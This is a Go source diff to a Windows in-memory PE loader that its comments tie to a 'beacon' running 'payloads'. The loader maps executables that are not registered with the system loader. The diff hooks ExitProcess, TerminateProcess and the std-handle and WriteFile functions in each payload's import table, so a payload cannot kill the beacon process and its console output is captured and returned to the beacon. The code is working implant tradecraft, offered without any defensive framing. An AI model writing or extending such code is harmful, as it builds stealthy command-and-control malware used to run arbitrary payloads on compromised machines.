@@ -44,10 +44,12 @@ package native
 // LoadLibrary. It is a narrower, in-process substitute for it.
 
 import (
+	"bytes"
 	"encoding/binary"
 	"errors"
 	"fmt"
 	"runtime"
+	"sync"
 	"syscall"
 	"unsafe"
 )
@@ -66,6 +68,184 @@ var (
 	peGetLastError   = peKernel32.NewProc("GetLastError")
 	peRtlAddFunctionTable = peKernel32.NewProc("RtlAddFunctionTable")
 )
+
+var (
+	peGetCurrentProcess    = peKernel32.NewProc("GetCurrentProcess")
+	peExitThread           = peKernel32.NewProc("ExitThread")
+	peTerminateProcess     = peKernel32.NewProc("TerminateProcess")
+	peRealGetStdHandle     = peKernel32.NewProc("GetStdHandle")
+	peRealWriteFile        = peKernel32.NewProc("WriteFile")
+	peRealWriteConsoleA    = peKernel32.NewProc("WriteConsoleA")
+	peRealWriteConsoleW    = peKernel32.NewProc("WriteConsoleW")
+)
+
+// Fake handle values the payload receives from GetStdHandle. Any
+// handle equal to one of these that arrives at WriteFile (or the
+// WriteConsole pair) is intercepted by the loader's stub and the
+// bytes are appended to peCaptureBuf. Any other handle value is
+// passed through to the real OS function.
+//
+// The values are chosen to be unmistakeable — no real handle
+// Windows returns looks like them — so the WriteFile stub can
+// distinguish "this is our fake handle" from "this is a real file
+// handle the payload opened" without any lookup table.
+const (
+	peFakeStdin  = 0xDEAD0001
+	peFakeStdout = 0xDEAD0002
+	peFakeStderr = 0xDEAD0003
+)
+
+var (
+	peCaptureMu  sync.Mutex
+	peCaptureBuf bytes.Buffer
+)
+
+// peHooks maps import names to the address the loader substitutes
+// for them in the payload's IAT. A name that appears here never
+// reaches the real kernel32 — the payload's call goes to our stub
+// instead.
+//
+// The list splits into two groups:
+//
+//   * process-termination functions. The payload's CRT calls these
+//     when main() returns. If they reach the OS, the beacon dies.
+//     The stubs redirect to ExitThread, which terminates just the
+//     payload's entry thread.
+//
+//   * std-handle functions. The payload asks for STD_OUTPUT_HANDLE
+//     and gets one of our fake values. Its subsequent WriteFile
+//     calls are detected by the WriteFile stub and their bytes
+//     appended to the capture buffer.
+var peHooks = map[string]uintptr{}
+
+// peInitHooks registers the callbacks. Called from ExecutePEInProcess
+// on first use so the Go runtime is guaranteed to be initialized
+// before syscall.NewCallback runs.
+var peHooksOnce sync.Once
+
+func peInitHooks() {
+	peHooksOnce.Do(func() {
+		peHooks["ExitProcess"] = syscall.NewCallback(
+			func(code uint32) uintptr {
+				// The payload's CRT called ExitProcess
+				// because main() returned. Do NOT kill
+				// the beacon's process; terminate only
+				// the thread the payload runs on.
+				peExitThread.Call(uintptr(code))
+				return 0
+			})
+		peHooks["RtlExitUserProcess"] = peHooks["ExitProcess"]
+
+		peHooks["ExitThread"] = syscall.NewCallback(
+			func(code uint32) uintptr {
+				peExitThread.Call(uintptr(code))
+				return 0
+			})
+		peHooks["RtlExitUserThread"] = peHooks["ExitThread"]
+
+		peHooks["TerminateProcess"] = syscall.NewCallback(
+			func(hProcess uintptr, code uint32) uintptr {
+				// A pseudo-handle of (HANDLE)-1 is what
+				// GetCurrentProcess returns. A payload
+				// that terminates its own process must
+				// not take the beacon with it.
+				if hProcess == ^uintptr(0) {
+					return 1
+				}
+				r, _, _ := peTerminateProcess.Call(
+					hProcess, uintptr(code))
+				return r
+			})
+
+		peHooks["GetStdHandle"] = syscall.NewCallback(
+			func(nStdHandle uint32) uintptr {
+				switch int32(nStdHandle) {
+				case -10: // STD_INPUT_HANDLE
+					return peFakeStdin
+				case -11: // STD_OUTPUT_HANDLE
+					return peFakeStdout
+				case -12: // STD_ERROR_HANDLE
+					return peFakeStderr
+				}
+				r, _, _ := peRealGetStdHandle.Call(
+					uintptr(nStdHandle))
+				return r
+			})
+
+		peHooks["WriteFile"] = syscall.NewCallback(
+			func(hFile, lpBuffer, nToWrite,
+				lpWritten, lpOverlapped uintptr) uintptr {
+				if hFile == peFakeStdout ||
+					hFile == peFakeStderr {
+					data := unsafe.Slice(
+						(*byte)(unsafe.Pointer(lpBuffer)),
+						int(nToWrite))
+					peCaptureMu.Lock()
+					peCaptureBuf.Write(data)
+					peCaptureMu.Unlock()
+					if lpWritten != 0 {
+						*(*uint32)(unsafe.Pointer(
+							lpWritten)) = uint32(nToWrite)
+					}
+					return 1
+				}
+				r, _, _ := peRealWriteFile.Call(
+					hFile, lpBuffer, nToWrite,
+					lpWritten, lpOverlapped)
+				return r
+			})
+
+		peHooks["WriteConsoleA"] = syscall.NewCallback(
+			func(hFile, lpBuffer, nToWrite,
+				lpWritten, lpReserved uintptr) uintptr {
+				if hFile == peFakeStdout ||
+					hFile == peFakeStderr {
+					data := unsafe.Slice(
+						(*byte)(unsafe.Pointer(lpBuffer)),
+						int(nToWrite))
+					peCaptureMu.Lock()
+					peCaptureBuf.Write(data)
+					peCaptureMu.Unlock()
+					if lpWritten != 0 {
+						*(*uint32)(unsafe.Pointer(
+							lpWritten)) = uint32(nToWrite)
+					}
+					return 1
+				}
+				r, _, _ := peRealWriteConsoleA.Call(
+					hFile, lpBuffer, nToWrite,
+					lpWritten, lpReserved)
+				return r
+			})
+
+		peHooks["WriteConsoleW"] = syscall.NewCallback(
+			func(hFile, lpBuffer, nToWrite,
+				lpWritten, lpReserved uintptr) uintptr {
+				if hFile == peFakeStdout ||
+					hFile == peFakeStderr {
+					// UTF-16 chars; convert to UTF-8
+					// before appending so the beacon's
+					// result handler sees text.
+					units := unsafe.Slice(
+						(*uint16)(unsafe.Pointer(lpBuffer)),
+						int(nToWrite))
+					utf8 := syscall.UTF16ToString(units)
+					peCaptureMu.Lock()
+					peCaptureBuf.WriteString(utf8)
+					peCaptureMu.Unlock()
+					if lpWritten != 0 {
+						*(*uint32)(unsafe.Pointer(
+							lpWritten)) = uint32(nToWrite)
+					}
+					return 1
+				}
+				r, _, _ := peRealWriteConsoleW.Call(
+					hFile, lpBuffer, nToWrite,
+					lpWritten, lpReserved)
+				return r
+			})
+	})
+}
 
 const (
 	peMemCommit  = 0x1000
@@ -394,8 +574,6 @@ func peProcessImports(img *peImage) error {
 
 			var addr uintptr
 			if ordinal {
-				// GetProcAddress(module, MAKEINTRESOURCE(ord)):
-				// the high word is zero, the low word is the ordinal.
 				addr, _, _ = peGetProcAddress.Call(hLib, uintptr(ord))
 			} else {
 				nameB, _ := syscall.BytePtrFromString(name)
@@ -405,6 +583,10 @@ func peProcessImports(img *peImage) error {
 			if addr == 0 {
 				return fmt.Errorf("pe: import %s!%s not resolvable",
 					libName, name)
+			}
+
+			if hook, ok := peHooks[name]; ok {
+				addr = hook
 			}
 			if img.is64 {
 				*(*uint64)(unsafe.Pointer(iat)) = uint64(addr)
@@ -546,6 +728,15 @@ func peFinalizeSections(img *peImage) {
 // not registered with the LDR and is not discoverable by a
 // later LoadLibrary call.
 func ExecutePEInProcess(raw []byte, waitMs int) (string, int, error) {
+	peInitHooks()
+
+	// Start each invocation with a clean capture buffer so a
+	// previous payload's output never leaks into this one's
+	// result.
+	peCaptureMu.Lock()
+	peCaptureBuf.Reset()
+	peCaptureMu.Unlock()
+
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 
@@ -607,8 +798,17 @@ func ExecutePEInProcess(raw []byte, waitMs int) (string, int, error) {
 	// stays mapped for the lifetime of the beacon process.
 	keepMapping = true
 
-	return fmt.Sprintf(
+	header := fmt.Sprintf(
 		"pe: loaded at 0x%x (image size 0x%x, entry RVA 0x%x, thread %d)\n",
-		img.imageBase, img.imageSize, img.entryRVA, tid,
-	), 0, nil
+		img.imageBase, img.imageSize, img.entryRVA, tid)
+
+	peCaptureMu.Lock()
+	captured := peCaptureBuf.String()
+	peCaptureBuf.Reset()
+	peCaptureMu.Unlock()
+
+	if captured == "" {
+		return header, 0, nil
+	}
+	return header + "\n--- payload output ---\n" + captured, 0, nil
 }
